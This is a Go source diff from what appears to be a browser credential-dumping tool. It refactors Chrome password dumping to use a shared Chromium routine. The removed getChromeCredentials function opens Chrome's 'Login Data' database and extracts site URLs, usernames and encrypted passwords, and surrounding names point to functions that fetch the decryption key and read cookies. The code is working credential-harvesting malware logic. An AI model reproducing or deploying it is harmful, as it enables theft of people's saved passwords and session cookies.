@@ -9,7 +9,6 @@ import (
 	"errors"
 	"fmt"
 	"net/http"
-	"net/url"
 	"os"
 	"strings"
 )
@@ -52,7 +51,7 @@ func (c Chrome) DumpCredentials() ([][]Credentials, error) {
 
 	dump := make([][]Credentials, len(c.profilePaths))
 	for _, profile := range c.profilePaths {
-		credentials, err := getChromeCredentials(fmt.Sprintf("%s\\%s", profile, "Login Data"))
+		credentials, err := getChromiumCredentials(fmt.Sprintf("%s\\%s", profile, "Login Data"))
 		if err != nil {
 			return nil, err
 		}
@@ -164,49 +163,6 @@ func getChromeDecryptionKey(basePath string) ([]byte, error) {
 		return nil, err
 	}
 	return key, nil
-}
-
-// TODO: refactor, is the same for brave
-func getChromeCredentials(path string) ([]Credentials, error) {
-	credentials := make([]Credentials, 0)
-	db, err := sql.Open("sqlite3", path)
-	if err != nil {
-		panic(err)
-	}
-	defer db.Close()
-
-	selectStatement := "SELECT origin_url, username_value, password_value FROM logins"
-	rows, err := db.Query(selectStatement)
-	if err != nil {
-		return credentials, errors.New(fmt.Sprintf("%s: %s\n", "[!] Chrome Running", err.Error()))
-	}
-
-	defer rows.Close()
-	for rows.Next() {
-		var (
-			loginUrlStr, user string
-			pass              []byte
-		)
-		err = rows.Scan(&loginUrlStr, &user, &pass)
-		if err != nil {
-			return credentials, err
-		}
-
-		if loginUrlStr == "" || user == "" || pass == nil {
-			continue
-		}
-		if strings.HasPrefix(loginUrlStr, "android") {
-			loginUrlStr = strings.Split(loginUrlStr, "==@")[1]
-		}
-
-		loginUrl, err := url.Parse(loginUrlStr)
-		if err != nil {
-			fmt.Printf("Error parsing %s: %s\n", loginUrlStr, err.Error())
-		}
-		credentials = append(credentials, Credentials{loginUrl, user, pass})
-	}
-
-	return credentials, nil
 }
 
 func getChromeCookies(path string) ([]http.Cookie, error) {
